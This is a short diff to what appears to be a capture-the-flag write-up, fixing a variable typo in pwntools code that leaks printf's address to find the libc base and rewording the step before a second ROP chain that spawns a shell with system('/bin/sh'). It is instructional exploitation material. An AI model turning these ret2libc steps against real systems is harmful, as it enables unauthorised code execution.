@@ -257,9 +257,9 @@ After setting libc.address, any symbol will from now on output the actual addres
 libc = ELF('./libc.so.6')
 io.recvuntil(b'the results:\n')
 libc_leak = u64(io.recvline().strip().ljust(8, b'\0'))
-log.info(f"printf @ {hex(lib_cleak)}")
+log.info(f"printf @ {hex(libc_leak)}")
 
-libc.address = lib_cleak - libc.sym.printf
+libc.address = libc_leak - libc.sym.printf
 log.info(f"libc @ {hex(libc.address)}")
 ```
 
@@ -282,7 +282,7 @@ Perfect! :chefskiss:
 Let's construct a second rop-chain to pop a shell. `system("/bin/sh")` is all we need.
 Same procedure as last time, miss Sophie?
 
-Change the ropchain a bit and everything else is the same.. No problem!
+Change the ropchain a bit, but the offsets and calculations stuff stay the same.. No problem!
 
 ```python
 rop = ROP(libc)
